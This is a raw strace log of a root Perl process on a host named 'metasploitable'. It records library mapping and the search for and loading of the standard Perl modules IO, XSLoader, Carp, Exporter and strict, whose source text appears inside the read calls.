\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
10004 07:30:53.673936 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
10004 07:30:53.673953 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d20000
10004 07:30:53.673964 mmap2(0xb7d29000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d29000
10004 07:30:53.673978 mmap2(0xb7d2b000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d2b000
10004 07:30:53.673991 close(1)          = 0
10004 07:30:53.674015 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d1f000
10004 07:30:53.674028 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d1f8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10004 07:30:53.674087 mprotect(0xb7e9b000, 4096, PROT_READ) = 0
10004 07:30:53.674114 munmap(0xb7ee3000, 29913) = 0
10004 07:30:53.674127 set_tid_address(0xb7d1f908) = 10004
10004 07:30:53.674136 set_robust_list(0xb7d1f910, 0xc) = 0
10004 07:30:53.674145 futex(0xbfeee380, 0x81 /* FUTEX_??? */, 1) = 0
10004 07:30:53.674160 rt_sigaction(SIGRTMIN, {0xb7ea52c0, [], SA_SIGINFO}, NULL, 8) = 0
10004 07:30:53.674182 rt_sigaction(SIGRT_1, {0xb7ea5340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
10004 07:30:53.674224 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
10004 07:30:53.674238 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
10004 07:30:53.674274 uname({sys="Linux", node="metasploitable", ...}) = 0
10004 07:30:53.674320 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
10004 07:30:53.674365 brk(0)            = 0x8153000
10004 07:30:53.674374 brk(0x8174000)    = 0x8174000
10004 07:30:53.674417 getuid32()        = 0
10004 07:30:53.674427 geteuid32()       = 0
10004 07:30:53.674436 getgid32()        = 0
10004 07:30:53.674444 getegid32()       = 0
10004 07:30:53.674481 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cfe000
10004 07:30:53.674507 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
10004 07:30:53.674523 read(1, "EW\255\272", 4) = 4
10004 07:30:53.674536 close(1)          = 0
10004 07:30:53.674554 time(NULL)        = 1495625453
10004 07:30:53.674595 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfeee050) = -1 ENOENT (No such file or directory)
10004 07:30:53.674612 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfeee050) = -1 ENOENT (No such file or directory)
10004 07:30:53.674630 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfeee050) = -1 ENOENT (No such file or directory)
10004 07:30:53.674645 stat64("/usr/local/lib/perl/5.8.7", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674657 stat64("/usr/local/share/perl/5.8.7", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674681 stat64("/usr/local/lib/perl/5.8.6", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674695 stat64("/usr/local/share/perl/5.8.6", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674736 stat64("/usr/local/lib/perl/5.8.4", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674748 stat64("/usr/local/share/perl/5.8.4", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674793 stat64("/usr/local/lib/perl/5.8.3", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674805 stat64("/usr/local/share/perl/5.8.3", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674816 stat64("/usr/local/lib/perl/5.8.2", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674827 stat64("/usr/local/share/perl/5.8.2", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674839 stat64("/usr/local/lib/perl/5.8.1", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674850 stat64("/usr/local/share/perl/5.8.1", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674861 stat64("/usr/local/lib/perl/5.8.0", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674873 stat64("/usr/local/share/perl/5.8.0", 0xbfeee190) = -1 ENOENT (No such file or directory)
10004 07:30:53.674895 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeede88) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.674909 _llseek(0, 0, [0], SEEK_CUR) = 0
10004 07:30:53.674920 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeede88) = -1 EBADF (Bad file descriptor)
10004 07:30:53.674930 _llseek(1, 0, 0xbfeeded0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
10004 07:30:53.674941 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeede88) = -1 EINVAL (Invalid argument)
10004 07:30:53.674951 _llseek(2, 0, 0xbfeeded0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10004 07:30:53.674961 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
10004 07:30:53.674973 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeedf48) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.674983 _llseek(1, 0, [0], SEEK_CUR) = 0
10004 07:30:53.674994 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
10004 07:30:53.675005 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
10004 07:30:53.675023 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
10004 07:30:53.675075 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
10004 07:30:53.675119 getppid()         = 10002
10004 07:30:53.675217 stat64("/etc/perl/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675234 stat64("/etc/perl/IO.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675280 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675293 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675306 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675318 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675332 stat64("/usr/lib/perl5/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675343 stat64("/usr/lib/perl5/IO.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675356 stat64("/usr/share/perl5/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675368 stat64("/usr/share/perl5/IO.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675381 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675398 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
10004 07:30:53.675419 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.675433 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.675444 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.675466 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
10004 07:30:53.675522 stat64("/etc/perl/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675535 stat64("/etc/perl/XSLoader.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675548 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675561 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675574 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675587 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675601 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675612 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675625 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675637 stat64("/usr/share/perl5/XSLoader.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675651 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.675663 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
10004 07:30:53.675724 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.675739 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.675750 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.675788 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
10004 07:30:53.676288 brk(0x8195000)    = 0x8195000
10004 07:30:53.676586 _llseek(8, 3407, [3407], SEEK_SET) = 0
10004 07:30:53.682417 _llseek(8, 0, [3407], SEEK_CUR) = 0
10004 07:30:53.682417 close(8)          = 0
10004 07:30:53.682417 stat64("/etc/perl/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682417 stat64("/etc/perl/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682418 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682427 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682441 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682453 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682466 stat64("/usr/lib/perl5/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682478 stat64("/usr/lib/perl5/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682490 stat64("/usr/share/perl5/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682502 stat64("/usr/share/perl5/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682515 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682527 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682540 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.682553 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
10004 07:30:53.682573 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.682587 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.682599 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.682620 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
10004 07:30:53.683104 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
10004 07:30:53.683132 read(8, "", 4096) = 0
10004 07:30:53.683143 close(8)          = 0
10004 07:30:53.683164 stat64("/etc/perl/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683191 stat64("/etc/perl/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683234 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683262 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683277 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683290 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683305 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683317 stat64("/usr/lib/perl5/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683331 stat64("/usr/share/perl5/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683356 stat64("/usr/share/perl5/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683369 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683381 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683395 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.683407 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
10004 07:30:53.683428 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.683442 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.683454 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.683470 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
10004 07:30:53.683995 _llseek(8, 2217, [2217], SEEK_SET) = 0
10004 07:30:53.684013 _llseek(8, 0, [2217], SEEK_CUR) = 0
10004 07:30:53.684023 close(8)          = 0
10004 07:30:53.684094 stat64("/etc/perl/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684110 stat64("/etc/perl/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684124 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684137 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684150 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684163 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684191 stat64("/usr/lib/perl5/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684231 stat64("/usr/lib/perl5/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684244 stat64("/usr/share/perl5/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684273 stat64("/usr/share/perl5/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684286 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684298 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684312 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.684324 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
10004 07:30:53.684345 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.684359 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.684370 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.684389 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
10004 07:30:53.684527 _llseek(8, 598, [598], SEEK_SET) = 0
10004 07:30:53.684541 _llseek(8, 0, [598], SEEK_CUR) = 0
10004 07:30:53.684551 close(8)          = 0
10004 07:30:53.684590 stat64("/etc/perl/warnings.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
